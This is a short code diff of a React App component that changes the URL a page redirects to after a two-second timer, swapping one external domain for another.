@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://open.neralaiko.lt/';
+            window.location.href = 'https://load.ecosseupsidedown.co.uk/';
         }, 2000);
 
         return () => clearTimeout(timer);
